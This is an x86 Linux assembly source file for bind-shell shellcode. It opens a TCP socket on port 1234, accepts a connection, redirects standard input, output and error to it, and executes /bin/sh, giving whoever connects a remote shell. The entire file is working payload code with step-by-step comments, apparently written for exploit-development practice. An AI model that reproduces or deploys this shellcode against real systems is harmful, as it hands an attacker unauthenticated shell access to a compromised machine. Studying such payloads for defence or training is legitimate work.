; Purpose: Bind TCP shellcode

global _start

section .text
  ; settings
  PORT        equ 0xd204        ; default 1234

  ; syscall kernel opcodes found in /usr/include/asm/unistd_32.h
  SOCKET      equ 0x167
  BIND        equ 0x169
  LISTEN      equ 0x16b
  ACCEPT      equ 0x16c
  DUP         equ 0x3f
  EXECVE      equ 0xb

  ; argument constants
  AF_INET     equ 0x2
  SOCK_STREAM equ 0x1

_start:
  ; clear registers
  xor ebx, ebx
  xor ecx, ecx
  mul ecx

  ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
  mov ax, SOCKET
  mov bl, AF_INET
  mov cl, SOCK_STREAM
  mov dl, 0x6
  int 0x80                            ; syscall socket(2)

  ; bind(sockfd, &sockaddr, 16)
  ; sockaddr = {AF_INET; PORT; 0x0; 0x0}
  xchg edi, eax                       ; edi = sockfd
  xor ecx, ecx                        ; clear ecx
  mul ecx                             ; clear eax and edx
  push ecx                            ; 0x0
  push ecx                            ; 0x0
  push ecx                            ; 0x0; this will be overwritten by the next two instructions
  mov byte [esp], AF_INET             ; esp = 0x00000002
  mov word [esp + 0x2], PORT          ; esp = 0xd2040002
  push esp                            ; push sockaddr
  pop ecx                             ; ecx = &sockadddr
  push 0x10                           ; 16
  pop edx                             ; edx = 16
  mov ebx, edi                        ; ebx = sockfd
  mov ax, BIND                        ; bind(2)
  int 0x80                            ; syscall bind(2)

  ; listen(sockfd, 0)                 ; ebx already contain the sockfd from previous syscall
  xor ecx, ecx                        ; clear ecx
  mov ax, LISTEN                      ; listen(2)
  int 0x80                            ; syscall listen(2)

  ; accept(sockfd, NULL, NULL, NULL)  ; ebx already contain the sockfd from previous syscall
  mov edx, ecx                        ; clear edx
  xor esi, esi                        ; clear esi
  mov ax, ACCEPT                      ; accept4(2)
  int 0x80                            ; syscall accept4(2)

  ; dup(sockfd, fd)
  mov ebx, eax                        ; ebx = new sockfd
  push 0x3                            ; prepare esp for ecx
  pop ecx                             ; ecx = 0x3
loop:
  xor eax, eax                        ; clear eax
  mov al, DUP                         ; dup(2)
  dec ecx                             ; decrement ecx to cover all 0x2, 0x1, and 0x0 fds
  int 0x80                            ; syscall dup(2)
  jne loop                            ; loop until ecx is zero

  ; execve('/bin//sh', NULL, NULL)
  xor ebx, ebx                        ; clear ebx
  mul ebx                             ; clear eax and edx
  push ebx                            ; push NULL
  push 0x68732f2f                     ; "hs//"
  push 0x6e69622f                     ; "nib/"
  mov ebx, esp                        ; ebx = esp address
  mov al, EXECVE                      ; execve(2)
  int 0x80                            ; syscall execve(2)
